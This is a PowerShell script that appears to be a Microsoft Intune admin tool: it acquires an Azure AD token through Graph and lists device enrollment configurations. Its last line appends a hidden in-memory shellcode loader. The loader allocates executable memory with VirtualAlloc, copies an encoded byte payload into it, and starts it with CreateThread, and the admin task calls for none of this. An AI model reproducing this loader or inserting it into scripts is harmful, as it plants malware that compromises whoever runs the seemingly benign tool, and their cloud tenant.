




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Get-DeviceEnrollmentConfigurations(){
    

    
    [cmdletbinding()]
    
    $graphApiVersion = "Beta"
    $Resource = "deviceManagement/deviceEnrollmentConfigurations"
        
        try {
            
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value
    
        }
        
        catch {
    
        $ex = $_.Exception
        $errorResponse = $ex.Response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($errorResponse)
        $reader.BaseStream.Position = 0
        $reader.DiscardBufferedData()
        $responseBody = $reader.ReadToEnd();
        Write-Host "Response content:`n$responseBody" -f Red
        Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
        write-host
        break
    
        }
    
    }





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





$DeviceEnrollmentConfigurations = Get-DeviceEnrollmentConfigurations

$DeviceEnrollmentConfigurations | Where-Object { ($_.id).contains("DefaultPlatformRestrictions") }

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd7,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xbb,0x7b,0xab,0x7d,0xc8,0xb1,0x47,0x31,0x5f,0x18,0x03,0x5f,0x18,0x83,0xef,0x87,0x49,0x88,0x34,0x9f,0x0c,0x73,0xc5,0x5f,0x71,0xfd,0x20,0x6e,0xb1,0x99,0x21,0xc0,0x01,0xe9,0x64,0xec,0xea,0xbf,0x9c,0x67,0x9e,0x17,0x92,0xc0,0x15,0x4e,0x9d,0xd1,0x06,0xb2,0xbc,0x51,0x55,0xe7,0x1e,0x68,0x96,0xfa,0x5f,0xad,0xcb,0xf7,0x32,0x66,0x87,0xaa,0xa2,0x03,0xdd,0x76,0x48,0x5f,0xf3,0xfe,0xad,0x17,0xf2,0x2f,0x60,0x2c,0xad,0xef,0x82,0xe1,0xc5,0xb9,0x9c,0xe6,0xe0,0x70,0x16,0xdc,0x9f,0x82,0xfe,0x2d,0x5f,0x28,0x3f,0x82,0x92,0x30,0x07,0x24,0x4d,0x47,0x71,0x57,0xf0,0x50,0x46,0x2a,0x2e,0xd4,0x5d,0x8c,0xa5,0x4e,0xba,0x2d,0x69,0x08,0x49,0x21,0xc6,0x5e,0x15,0x25,0xd9,0xb3,0x2d,0x51,0x52,0x32,0xe2,0xd0,0x20,0x11,0x26,0xb9,0xf3,0x38,0x7f,0x67,0x55,0x44,0x9f,0xc8,0x0a,0xe0,0xeb,0xe4,0x5f,0x99,0xb1,0x60,0x93,0x90,0x49,0x70,0xbb,0xa3,0x3a,0x42,0x64,0x18,0xd5,0xee,0xed,0x86,0x22,0x11,0xc4,0x7f,0xbc,0xec,0xe7,0x7f,0x94,0x2a,0xb3,0x2f,0x8e,0x9b,0xbc,0xbb,0x4e,0x24,0x69,0x51,0x4a,0xb2,0xfb,0xcf,0x93,0x99,0x94,0x0d,0x1c,0x1c,0xde,0x9b,0xfa,0x4e,0x70,0xcc,0x52,0x2e,0x20,0xac,0x02,0xc6,0x2a,0x23,0x7c,0xf6,0x54,0xe9,0x15,0x9c,0xba,0x44,0x4d,0x08,0x22,0xcd,0x05,0xa9,0xab,0xdb,0x63,0xe9,0x20,0xe8,0x94,0xa7,0xc0,0x85,0x86,0x5f,0x21,0xd0,0xf5,0xc9,0x3e,0xce,0x90,0xf5,0xaa,0xf5,0x32,0xa2,0x42,0xf4,0x63,0x84,0xcc,0x07,0x46,0x9f,0xc5,0x9d,0x29,0xf7,0x29,0x72,0xaa,0x07,0x7c,0x18,0xaa,0x6f,0xd8,0x78,0xf9,0x8a,0x27,0x55,0x6d,0x07,0xb2,0x56,0xc4,0xf4,0x15,0x3f,0xea,0x23,0x51,0xe0,0x15,0x06,0x63,0xdc,0xc3,0x6e,0x11,0x0c,0xd0;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

